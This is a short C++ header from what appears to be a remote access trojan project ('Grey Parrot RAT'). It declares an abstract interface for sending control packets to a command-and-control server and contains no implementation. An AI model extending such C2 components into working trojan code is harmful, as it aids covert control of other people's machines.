//
// Created by alsah on 14.05.23.
//

#ifndef GREY_PARROT_RAT_CORE_MESSAGES_SENDER_INTERFACE_H
#define GREY_PARROT_RAT_CORE_MESSAGES_SENDER_INTERFACE_H


#include <vector>
#include <variant>


/**
 * @interface IControlPacketSender
 *
 * Sends control packet to the c2server
 */
class IControlPacketSender {
public:
    virtual void send(const msgs::ControlPacket&  data) = 0;

    virtual std::size_t getMaxSize(bool c2channel) = 0;
};


#endif //GREY_PARROT_RAT_CORE_MESSAGES_SENDER_INTERFACE_H
